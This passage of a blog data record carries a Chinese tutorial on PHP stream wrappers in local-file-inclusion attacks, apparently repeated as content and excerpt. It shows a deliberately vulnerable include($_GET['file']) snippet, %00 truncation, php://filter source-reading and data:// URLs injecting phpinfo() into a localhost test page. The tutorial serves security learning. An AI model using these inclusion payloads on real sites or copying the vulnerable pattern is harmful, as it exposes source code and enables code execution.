phpinfo()?>\n\nhttp://localhost/temp.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n\n![](/pic/21.png)\n\n### 0x05 总结\n\n![](/pic/22.png)","slug":"关于PHP伪协议的分析","published":1,"updated":"2020-01-03T12:17:47.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfmo001jpk7eaj8q95qh","content":"<h3 id=\"0X00-简介\"><a href=\"#0X00-简介\" class=\"headerlink\" title=\"0X00 简介\"></a>0X00 简介</h3><p>PHP支持的协议和封装协议</p>\n<ul>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.file.php\" target=\"_blank\" rel=\"noopener\">file://</a>   </p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.http.php\" target=\"_blank\" rel=\"noopener\">http://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.ftp.php\" target=\"_blank\" rel=\"noopener\">ftp://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.php.php\" target=\"_blank\" rel=\"noopener\">php://</a>     </p>\n<a id=\"more\"></a>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.compression.php\" target=\"_blank\" rel=\"noopener\">zlib://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.data.php\" target=\"_blank\" rel=\"noopener\">data://</a>    </p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.glob.php\" target=\"_blank\" rel=\"noopener\">glob://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.phar.php\" target=\"_blank\" rel=\"noopener\">phar://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.ssh2.php\" target=\"_blank\" rel=\"noopener\">ssh2://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.rar.php\" target=\"_blank\" rel=\"noopener\">rar://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.audio.php\" target=\"_blank\" rel=\"noopener\">ogg://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.expect.php\" target=\"_blank\" rel=\"noopener\">expect://</a></p>\n</li>\n</ul>\n<p>常见的文件包含函数：</p>\n<p><strong>1. include函数</strong></p>\n<p>通过get方法或post方法include的文件首先是从当前文件夹下开始读取，此时目录穿越漏洞可以用</p>\n<p>不能够读取自己，否则会出现逻辑错误</p>\n<p>如果直接包含一个php文件，则只会显示其中在标签外的内容，以及php代码输出的内容</p>\n<p>若要读取php文件的内容，则需要将其编码，例：php://filter/read=convert.base64-encode/resource=123.php</p>\n<p>使用时如果有多个文件符合，只会输出第一个</p>\n<p><strong>2. highlight_file函数</strong></p>\n<p>将文件以内置的颜色输出，可以输出php文件，也可以输出其他文件<br>如果第二个参数return设置为true，那么文件内容将不会输出，而是返回一个字符串</p>\n<h4 id=\"3-show-source函数\"><a href=\"#3-show-source函数\" class=\"headerlink\" title=\"3. show_source函数\"></a>3. show_source函数</h4><p>上面函数的别名，功能是一样的</p>\n<p><strong>4. file_get_contents函数</strong></p>\n<p>将一个文件读入一个字符串<br>包含的文件需要在源码中才能看到，或者使用伪协议将其base64加密</p>\n<p><strong>5. fopen函数</strong></p>\n<p>因为返回的是一个指针，所以不能够直接读取，需要用fgets或者fread读取指针指向的内容，或者使用fpassthru读取指针指向剩下的内容</p>\n<p><strong>6. readfile函数</strong></p>\n<p>功能是读取一个文件到缓冲区，返回一个整数(为文件的内字符的长度)</p>\n<p><strong>7. file函数</strong></p>\n<p>功能是将一个文件读入数组，数组的键是行数(从0开始),数组的值为该行的内容</p>\n<p>allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。</p>\n<p>allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。</p>\n<h3 id=\"0x01-file\"><a href=\"#0x01-file\" class=\"headerlink\" title=\"0x01  file://\"></a>0x01  file://</h3><p>file://不受<code>allow_url_fopen、allow_url_include·</code>影响</p>\n<blockquote>\n<p>file:// [文件的绝对路径和文件名]</p>\n</blockquote>\n<p><a href=\"http://127.0.0.1/temp.php?file=file:///wamp/www/1.php\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/temp.php?file=file:///wamp/www/1.php</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">include($_GET[&#39;file&#39;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pic/14.png\" alt=\"\"></p>\n<p><strong>截断</strong></p>\n<p>若读取的文件为非PHP后缀，在php版本&lt;=5.2可使用%00截断</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">include($_GET[&#39;file&#39;].’.php’);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"0x02-php\"><a href=\"#0x02-php\" class=\"headerlink\" title=\"0x02 php://\"></a>0x02 php://</h3><p>无需<code>allow_url_fopen on</code>，仅<code>php://input、 php://stdin、 php://memory 、php://temp</code> 需要开启<code>allow_url_include</code>。</p>\n<p>php:// 访问各个输入/输出流（I/O streams）</p>\n<ol>\n<li><h4 id=\"php-filter\"><a href=\"#php-filter\" class=\"headerlink\" title=\"php://filter\"></a>php://filter</h4></li>\n</ol>\n<table>\n<thead>\n<tr>\n<th align=\"left\">属性</th>\n<th align=\"left\">支持</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">受限于 <a href=\"https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen\" target=\"_blank\" rel=\"noopener\">allow_url_fopen</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">受限于 <a href=\"https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include\" target=\"_blank\" rel=\"noopener\">allow_url_include</a></td>\n<td align=\"left\">仅 <em>php://input<em>、 *php://stdin</em>、 *php://memory</em> 和 <em>php://temp</em>。</td>\n</tr>\n<tr>\n<td align=\"left\">允许读取</td>\n<td align=\"left\">仅 <em>php://stdin<em>、 *php://input</em>、 <em>php://fd</em>、 *php://memory</em> 和 <em>php://temp</em>。</td>\n</tr>\n<tr>\n<td align=\"left\">允许写入</td>\n<td align=\"left\">仅 <em>php://stdout<em>、 *php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、 *php://memory</em> 和 <em>php://temp</em>。</td>\n</tr>\n<tr>\n<td align=\"left\">允许追加</td>\n<td align=\"left\">仅 <em>php://stdout<em>、 *php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、 *php://memory</em> 和 <em>php://temp</em>（等于写入）</td>\n</tr>\n<tr>\n<td align=\"left\">允许同时读写</td>\n<td align=\"left\">仅 <em>php://fd*、 *php://memory</em> 和 <em>php://temp</em>。</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.stat.php\" target=\"_blank\" rel=\"noopener\">stat()</a></td>\n<td align=\"left\">仅 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.unlink.php\" target=\"_blank\" rel=\"noopener\">unlink()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.rename.php\" target=\"_blank\" rel=\"noopener\">rename()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.mkdir.php\" target=\"_blank\" rel=\"noopener\">mkdir()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.rmdir.php\" target=\"_blank\" rel=\"noopener\">rmdir()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">仅仅支持 <a href=\"https://www.php.net/manual/zh/function.stream-select.php\" target=\"_blank\" rel=\"noopener\">stream_select()</a></td>\n<td align=\"left\"><em>php://stdin<em>、 *php://stdout</em>、 <em>php://stderr</em>、 *php://fd</em> 和 <em>php://temp</em>。</td>\n</tr>\n</tbody></table>\n<p>​    a. 多用于读取源码php://filter/read=convert.base64-encode/resource=   （<em>include、highlight_file、show_source、readfile</em>可用）</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">名称</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><em>resource=&lt;要过滤的数据流&gt;</em></td>\n<td align=\"left\">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>\n</tr>\n<tr>\n<td align=\"left\"><em>read=&lt;读链的筛选列表&gt;</em></td>\n<td align=\"left\">该参数可选。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td>\n</tr>\n<tr>\n<td align=\"left\"><em>write=&lt;写链的筛选列表&gt;</em></td>\n<td align=\"left\">该参数可选。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td>\n</tr>\n<tr>\n<td align=\"left\">*&lt;；两个链的筛选列表&gt;*</td>\n<td align=\"left\">任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀 的筛选器列表会视情况应用于读或写链。</td>\n</tr>\n</tbody></table>\n<p>常用筛选过滤列表</p>\n<blockquote>\n<ol>\n<li>string.rot13  rot13加密</li>\n<li>string.toupper   转换成大写</li>\n<li>string.tolower   转换成小写</li>\n<li>string.srip_tags   去除标签</li>\n<li>convert.base64-encode &amp; convert.base64-decode</li>\n<li>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</li>\n</ol>\n</blockquote>\n<p><img src=\"/pic/15.png\" alt=\"\"></p>\n<p><img src=\"/pic/16.png\" alt=\"\"></p>\n<p><img src=\"/pic/17.png\" alt=\"\">已经把&lt; &gt;中的数据去除 所以已经没有数据</p>\n<ol start=\"2\">\n<li><h4 id=\"php-input\"><a href=\"#php-input\" class=\"headerlink\" title=\"php://input\"></a>php://input</h4><p> <em>enctype=”multipart/form-data”</em> 的时候 php://input 是无效的。此协议多用于命令执行需要<strong>allow_url_include：on</strong></p>\n</li>\n</ol>\n<p>​      <img src=\"/pic/18.png\" alt=\"\"> </p>\n<p>​       <img src=\"/pic/19.png\" alt=\"\"></p>\n<ol start=\"3\">\n<li><h3 id=\"php-output\"><a href=\"#php-output\" class=\"headerlink\" title=\"php://output\"></a>php://output</h3><p>php://output 是一个只写的数据流， 允许你以 <a href=\"https://www.php.net/manual/zh/function.print.php\" target=\"_blank\" rel=\"noopener\">print</a> 和 <a href=\"https://www.php.net/manual/zh/function.echo.php\" target=\"_blank\" rel=\"noopener\">echo</a> 一样的方式 写入到输出缓冲区。</p>\n</li>\n</ol>\n<h3 id=\"0x03-zip-bzip2-zlib-协议\"><a href=\"#0x03-zip-bzip2-zlib-协议\" class=\"headerlink\" title=\"0x03 zip://, bzip2://, zlib://协议\"></a>0x03 zip://, bzip2://, zlib://协议</h3><p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">属性</th>\n<th align=\"left\">支持</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">受限于 <a href=\"https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen\" target=\"_blank\" rel=\"noopener\">allow_url_fopen</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">允许读取</td>\n<td align=\"left\">Yes</td>\n</tr>\n<tr>\n<td align=\"left\">允许写入</td>\n<td align=\"left\">Yes（除了 <em>zip://</em>）</td>\n</tr>\n<tr>\n<td align=\"left\">允许附加</td>\n<td align=\"left\">Yes（除了 <em>zip://</em>）</td>\n</tr>\n<tr>\n<td align=\"left\">允许同时读写</td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.stat.php\" target=\"_blank\" rel=\"noopener\">stat()</a></td>\n<td align=\"left\">No，请使用普通的 <em>file://</em> 封装器统计压缩文件。</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.unlink.php\" target=\"_blank\" rel=\"noopener\">unlink()</a></td>\n<td align=\"left\">No，请使用 <em>file://</em> 封装器删除压缩文件。</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.rename.php\" target=\"_blank\" rel=\"noopener\">rename()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.mkdir.php\" target=\"_blank\" rel=\"noopener\">mkdir()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.rmdir.php\" target=\"_blank\" rel=\"noopener\">rmdir()</a></td>\n<td align=\"left\">No</td>\n</tr>\n</tbody></table>\n<h4 id=\"1-zip-协议\"><a href=\"#1-zip-协议\" class=\"headerlink\" title=\"1. zip://协议\"></a>1. zip://协议</h4><p>zip:// [压缩文件路径]#[压缩文件内的子文件]</p>\n<p>测试失败 ,报错</p>\n<p><strong>【bzip2://协议】</strong></p>\n<p><strong>使用方法：</strong></p>\n<p>compress.bzip2://[压缩文件地址]</p>\n<p>测试失败 没有返回数据</p>\n<h4 id=\"3-zlib-协议\"><a href=\"#3-zlib-协议\" class=\"headerlink\" title=\"3. zlib://协议\"></a>3. zlib://协议</h4><p>compress.zlib://[压缩文件地址]</p>\n<p><img src=\"/pic/20.png\" alt=\"\"></p>\n<h3 id=\"0x04-data\"><a href=\"#0x04-data\" class=\"headerlink\" title=\"0x04 data://\"></a>0x04 data://</h3><p>经过测试官方文档上存在问题，经过测试data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">属性</th>\n<th align=\"left\">支持</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">受限于 <a href=\"https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen\" target=\"_blank\" rel=\"noopener\">allow_url_fopen</a></td>\n<td align=\"left\">Yes</td>\n</tr>\n<tr>\n<td align=\"left\">受限于 <a href=\"https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include\" target=\"_blank\" rel=\"noopener\">allow_url_include</a></td>\n<td align=\"left\">Yes</td>\n</tr>\n<tr>\n<td align=\"left\">允许读取</td>\n<td align=\"left\">Yes</td>\n</tr>\n<tr>\n<td align=\"left\">允许写入</td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">允许追加</td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">允许同时读写</td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.stat.php\" target=\"_blank\" rel=\"noopener\">stat()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.unlink.php\" target=\"_blank\" rel=\"noopener\">unlink()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.rename.php\" target=\"_blank\" rel=\"noopener\">rename()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.mkdir.php\" target=\"_blank\" rel=\"noopener\">mkdir()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.rmdir.php\" target=\"_blank\" rel=\"noopener\">rmdir()</a></td>\n<td align=\"left\">No</td>\n</tr>\n</tbody></table>\n<p><a href=\"http://localhost/temp.php?file=data://text/plain\" target=\"_blank\" rel=\"noopener\">http://localhost/temp.php?file=data://text/plain</a>,<?php phpinfo()?></p>\n<p><a href=\"http://localhost/temp.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\" target=\"_blank\" rel=\"noopener\">http://localhost/temp.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>\n<p><a href=\"http://localhost/temp.php?file=data:text/plain\" target=\"_blank\" rel=\"noopener\">http://localhost/temp.php?file=data:text/plain</a>,<?php phpinfo()?></p>\n<p><a href=\"http://localhost/temp.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\" target=\"_blank\" rel=\"noopener\">http://localhost/temp.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>\n<p><img src=\"/pic/21.png\" alt=\"\"></p>\n<h3 id=\"0x05-总结\"><a href=\"#0x05-总结\" class=\"headerlink\" title=\"0x05 总结\"></a>0x05 总结</h3><p><img src=\"/pic/22.png\" alt=\"\"></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"0X00-简介\"><a href=\"#0X00-简介\" class=\"headerlink\" title=\"0X00 简介\"></a>0X00 简介</h3><p>PHP支持的协议和封装协议</p>\n<ul>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.file.php\" target=\"_blank\" rel=\"noopener\">file://</a>   </p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.http.php\" target=\"_blank\" rel=\"noopener\">http://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.ftp.php\" target=\"_blank\" rel=\"noopener\">ftp://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.php.php\" target=\"_blank\" rel=\"noopener\">php://</a>     </p>","more":"</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.compression.php\" target=\"_blank\" rel=\"noopener\">zlib://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.data.php\" target=\"_blank\" rel=\"noopener\">data://</a>    </p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.glob.php\" target=\"_blank\" rel=\"noopener\">glob://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.phar.php\" target=\"_blank\" rel=\"noopener\">phar://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.ssh2.php\" target=\"_blank\" rel=\"noopener\">ssh2://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.rar.php\" target=\"_blank\" rel=\"noopener\">rar://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.audio.php\" target=\"_blank\" rel=\"noopener\">ogg://</a></p>\n</li>\n<li><p><a href=\"https://www.php.net/manual/zh/wrappers.expect.php\" target=\"_blank\" rel=\"noopener\">expect://</a></p>\n</li>\n</ul>\n<p>常见的文件包含函数：</p>\n<p><strong>1. include函数</strong></p>\n<p>通过get方法或post方法include的文件首先是从当前文件夹下开始读取，此时目录穿越漏洞可以用</p>\n<p>不能够读取自己，否则会出现逻辑错误</p>\n<p>如果直接包含一个php文件，则只会显示其中在标签外的内容，以及php代码输出的内容</p>\n<p>若要读取php文件的内容，则需要将其编码，例：php://filter/read=convert.base64-encode/resource=123.php</p>\n<p>使用时如果有多个文件符合，只会输出第一个</p>\n<p><strong>2. highlight_file函数</strong></p>\n<p>将文件以内置的颜色输出，可以输出php文件，也可以输出其他文件<br>如果第二个参数return设置为true，那么文件内容将不会输出，而是返回一个字符串</p>\n<h4 id=\"3-show-source函数\"><a href=\"#3-show-source函数\" class=\"headerlink\" title=\"3. show_source函数\"></a>3. show_source函数</h4><p>上面函数的别名，功能是一样的</p>\n<p><strong>4. file_get_contents函数</strong></p>\n<p>将一个文件读入一个字符串<br>包含的文件需要在源码中才能看到，或者使用伪协议将其base64加密</p>\n<p><strong>5. fopen函数</strong></p>\n<p>因为返回的是一个指针，所以不能够直接读取，需要用fgets或者fread读取指针指向的内容，或者使用fpassthru读取指针指向剩下的内容</p>\n<p><strong>6. readfile函数</strong></p>\n<p>功能是读取一个文件到缓冲区，返回一个整数(为文件的内字符的长度)</p>\n<p><strong>7. file函数</strong></p>\n<p>功能是将一个文件读入数组，数组的键是行数(从0开始),数组的值为该行的内容</p>\n<p>allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。</p>\n<p>allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。</p>\n<h3 id=\"0x01-file\"><a href=\"#0x01-file\" class=\"headerlink\" title=\"0x01  file://\"></a>0x01  file://</h3><p>file://不受<code>allow_url_fopen、allow_url_include·</code>影响</p>\n<blockquote>\n<p>file:// [文件的绝对路径和文件名]</p>\n</blockquote>\n<p><a href=\"http://127.0.0.1/temp.php?file=file:///wamp/www/1.php\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/temp.php?file=file:///wamp/www/1.php</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">include($_GET[&#39;file&#39;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pic/14.png\" alt=\"\"></p>\n<p><strong>截断</strong></p>\n<p>若读取的文件为非PHP后缀，在php版本&lt;=5.2可使用%00截断</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">include($_GET[&#39;file&#39;].’.php’);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"0x02-php\"><a href=\"#0x02-php\" class=\"headerlink\" title=\"0x02 php://\"></a>0x02 php://</h3><p>无需<code>allow_url_fopen on</code>，仅<code>php://input、 php://stdin、 php://memory 、php://temp</code> 需要开启<code>allow_url_include</code>。</p>\n<p>php:// 访问各个输入/输出流（I/O streams）</p>\n<ol>\n<li><h4 id=\"php-filter\"><a href=\"#php-filter\" class=\"headerlink\" title=\"php://filter\"></a>php://filter</h4></li>\n</ol>\n<table>\n<thead>\n<tr>\n<th align=\"left\">属性</th>\n<th align=\"left\">支持</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">受限于 <a href=\"https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen\" target=\"_blank\" rel=\"noopener\">allow_url_fopen</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">受限于 <a href=\"https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include\" target=\"_blank\" rel=\"noopener\">allow_url_include</a></td>\n<td align=\"left\">仅 <em>php://input<em>、 *php://stdin</em>、 *php://memory</em> 和 <em>php://temp</em>。</td>\n</tr>\n<tr>\n<td align=\"left\">允许读取</td>\n<td align=\"left\">仅 <em>php://stdin<em>、 *php://input</em>、 <em>php://fd</em>、 *php://memory</em> 和 <em>php://temp</em>。</td>\n</tr>\n<tr>\n<td align=\"left\">允许写入</td>\n<td align=\"left\">仅 <em>php://stdout<em>、 *php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、 *php://memory</em> 和 <em>php://temp</em>。</td>\n</tr>\n<tr>\n<td align=\"left\">允许追加</td>\n<td align=\"left\">仅 <em>php://stdout<em>、 *php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、 *php://memory</em> 和 <em>php://temp</em>（等于写入）</td>\n</tr>\n<tr>\n<td align=\"left\">允许同时读写</td>\n<td align=\"left\">仅 <em>php://fd*、 *php://memory</em> 和 <em>php://temp</em>。</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.stat.php\" target=\"_blank\" rel=\"noopener\">stat()</a></td>\n<td align=\"left\">仅 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.unlink.php\" target=\"_blank\" rel=\"noopener\">unlink()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.rename.php\" target=\"_blank\" rel=\"noopener\">rename()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.mkdir.php\" target=\"_blank\" rel=\"noopener\">mkdir()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.rmdir.php\" target=\"_blank\" rel=\"noopener\">rmdir()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">仅仅支持 <a href=\"https://www.php.net/manual/zh/function.stream-select.php\" target=\"_blank\" rel=\"noopener\">stream_select()</a></td>\n<td align=\"left\"><em>php://stdin<em>、 *php://stdout</em>、 <em>php://stderr</em>、 *php://fd</em> 和 <em>php://temp</em>。</td>\n</tr>\n</tbody></table>\n<p>​    a. 多用于读取源码php://filter/read=convert.base64-encode/resource=   （<em>include、highlight_file、show_source、readfile</em>可用）</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">名称</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><em>resource=&lt;要过滤的数据流&gt;</em></td>\n<td align=\"left\">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>\n</tr>\n<tr>\n<td align=\"left\"><em>read=&lt;读链的筛选列表&gt;</em></td>\n<td align=\"left\">该参数可选。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td>\n</tr>\n<tr>\n<td align=\"left\"><em>write=&lt;写链的筛选列表&gt;</em></td>\n<td align=\"left\">该参数可选。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td>\n</tr>\n<tr>\n<td align=\"left\">*&lt;；两个链的筛选列表&gt;*</td>\n<td align=\"left\">任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀 的筛选器列表会视情况应用于读或写链。</td>\n</tr>\n</tbody></table>\n<p>常用筛选过滤列表</p>\n<blockquote>\n<ol>\n<li>string.rot13  rot13加密</li>\n<li>string.toupper   转换成大写</li>\n<li>string.tolower   转换成小写</li>\n<li>string.srip_tags   去除标签</li>\n<li>convert.base64-encode &amp; convert.base64-decode</li>\n<li>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</li>\n</ol>\n</blockquote>\n<p><img src=\"/pic/15.png\" alt=\"\"></p>\n<p><img src=\"/pic/16.png\" alt=\"\"></p>\n<p><img src=\"/pic/17.png\" alt=\"\">已经把&lt; &gt;中的数据去除 所以已经没有数据</p>\n<ol start=\"2\">\n<li><h4 id=\"php-input\"><a href=\"#php-input\" class=\"headerlink\" title=\"php://input\"></a>php://input</h4><p> <em>enctype=”multipart/form-data”</em> 的时候 php://input 是无效的。此协议多用于命令执行需要<strong>allow_url_include：on</strong></p>\n</li>\n</ol>\n<p>​      <img src=\"/pic/18.png\" alt=\"\"> </p>\n<p>​       <img src=\"/pic/19.png\" alt=\"\"></p>\n<ol start=\"3\">\n<li><h3 id=\"php-output\"><a href=\"#php-output\" class=\"headerlink\" title=\"php://output\"></a>php://output</h3><p>php://output 是一个只写的数据流， 允许你以 <a href=\"https://www.php.net/manual/zh/function.print.php\" target=\"_blank\" rel=\"noopener\">print</a> 和 <a href=\"https://www.php.net/manual/zh/function.echo.php\" target=\"_blank\" rel=\"noopener\">echo</a> 一样的方式 写入到输出缓冲区。</p>\n</li>\n</ol>\n<h3 id=\"0x03-zip-bzip2-zlib-协议\"><a href=\"#0x03-zip-bzip2-zlib-协议\" class=\"headerlink\" title=\"0x03 zip://, bzip2://, zlib://协议\"></a>0x03 zip://, bzip2://, zlib://协议</h3><p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">属性</th>\n<th align=\"left\">支持</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">受限于 <a href=\"https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen\" target=\"_blank\" rel=\"noopener\">allow_url_fopen</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">允许读取</td>\n<td align=\"left\">Yes</td>\n</tr>\n<tr>\n<td align=\"left\">允许写入</td>\n<td align=\"left\">Yes（除了 <em>zip://</em>）</td>\n</tr>\n<tr>\n<td align=\"left\">允许附加</td>\n<td align=\"left\">Yes（除了 <em>zip://</em>）</td>\n</tr>\n<tr>\n<td align=\"left\">允许同时读写</td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.stat.php\" target=\"_blank\" rel=\"noopener\">stat()</a></td>\n<td align=\"left\">No，请使用普通的 <em>file://</em> 封装器统计压缩文件。</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.unlink.php\" target=\"_blank\" rel=\"noopener\">unlink()</a></td>\n<td align=\"left\">No，请使用 <em>file://</em> 